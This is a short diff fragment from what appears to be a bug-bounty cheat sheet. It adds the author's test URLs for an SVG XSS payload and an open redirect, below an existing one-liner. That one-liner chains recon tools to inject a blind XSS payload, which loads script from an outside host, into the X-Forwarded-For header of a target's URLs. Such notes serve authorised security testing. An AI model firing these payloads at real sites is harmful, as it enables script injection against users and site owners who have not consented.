@@ -132,3 +132,11 @@ XSS from wayback:
 
 XSS in x-forward header:  
 `findomain -t http://TARGET.COM | gau | bxss -payload '"><script src=https://chirag.bxss.in></script>' -header "X-Forwarded-For"`  
+
+
+# My site test urls:
+xss:  
+`https://mochungusxd.web.app/payloads/svgxss.html`   
+
+Open-Redirect:  
+`https://mochungusxd.web.app/`
